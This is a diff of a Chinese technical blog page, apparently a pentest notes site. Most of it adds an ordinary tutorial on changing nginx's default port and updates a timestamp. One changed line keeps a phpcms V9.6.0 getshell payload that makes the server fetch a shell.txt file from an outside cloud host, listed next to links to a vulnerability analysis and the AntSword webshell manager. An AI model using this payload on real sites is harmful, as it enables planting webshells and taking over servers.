@@ -673,7 +673,7 @@
 <p>脚本语言：php中间件：iis6.0，nginx；cms：phpcms V9.6.0</p>
 <p>漏洞利用文章：<a target="_blank" rel="noopener" href="http://blog.nsfocus.net/phpcms-v9-6-getshell-0day-vulnerability-analysis/">http://blog.nsfocus.net/phpcms-v9-6-getshell-0day-vulnerability-analysis/</a></p>
 <p>​    —相关工具</p>
-<p>​       payload：[siteid=1&amp;modelid=11&amp;username=saesvens1&amp;password=ssevses&amp;mail=<a href="mailto:&#115;&#x73;&#x65;&#x76;&#101;&#x6e;&#115;&#x73;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#109;">&#115;&#x73;&#x65;&#x76;&#101;&#x6e;&#115;&#x73;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#109;</a>&amp;info[content]= src=<a target="_blank" rel="noopener" href="http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=">http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</a></p>
+<p>​       payload：[siteid=1&amp;modelid=11&amp;username=saesvens1&amp;password=ssevses&amp;mail=<a href="mailto:&#x73;&#115;&#101;&#118;&#101;&#x6e;&#x73;&#x73;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;">&#x73;&#115;&#101;&#118;&#101;&#x6e;&#x73;&#x73;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;</a>&amp;info[content]= src=<a target="_blank" rel="noopener" href="http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=">http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</a></p>
 <p>​       中国蚁剑：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1045553189/article/details/87517612">https://blog.csdn.net/qq1045553189/article/details/87517612</a></p>
 <p>​       蚁剑目录：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
 <p>​       加速器：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a></p>
@@ -1663,7 +1663,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-06-03 12:55:15" itemprop="dateModified" datetime="2022-06-03T12:55:15+08:00">2022-06-03</time>
+                <time title="修改时间：2022-08-31 14:43:06" itemprop="dateModified" datetime="2022-08-31T14:43:06+08:00">2022-08-31</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -2640,6 +2640,22 @@
 <li>键入 leafpad /etc/NetworkManager/NetworkManager.conf 将其中的false改为true</li>
 <li>键入ifup eth0 启动网卡</li>
 </ol>
+<h1 id="更改nginx默认端口，ubuntu更改nginx端口号"><a href="#更改nginx默认端口，ubuntu更改nginx端口号" class="headerlink" title="更改nginx默认端口，ubuntu更改nginx端口号"></a>更改nginx默认端口，ubuntu更改nginx端口号</h1><p>我们都知道nginx 默认使用80端口，有时候我们希望nginx运行在其他端口，就需要更改nginx配置<br>nginx配置文件在/etc/nginx目录下的nginx.conf。在nginx.conf-&gt;http选项末尾有引入两个目录下的文件分别为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">        #   省略部分内容    </span><br><span class="line">        include /etc/nginx/conf.d/*.conf;</span><br><span class="line">        include /etc/nginx/sites-enabled/*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们查看/etc/nginx/sites-enabled/目录，会找到一个default文件，在server选项下前两行就可以找到使用的80端口号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        listen [::]:80 default_server;</span><br></pre></td></tr></table></figure>
+
+<p>将80端口号改为想使用的端口号，保存文件，如果没有启动nginx，启动即可。如果nginx已经在运行，重新加载即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx start #运行nginx</span><br><span class="line">sudo nginx -s reload #重启nginx</span><br></pre></td></tr></table></figure>
+
+<p>如果遇到nginx报以下错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx: [error] open() &quot;/run/nginx.pid&quot; failed (2: No such file or directory)</span><br></pre></td></tr></table></figure>
+
+<p>sudo nginx -c path/.conf #指定nginx配置.conf的位置</p>
+<p>查看nginx运行端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netstat -anp | grep nginx</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
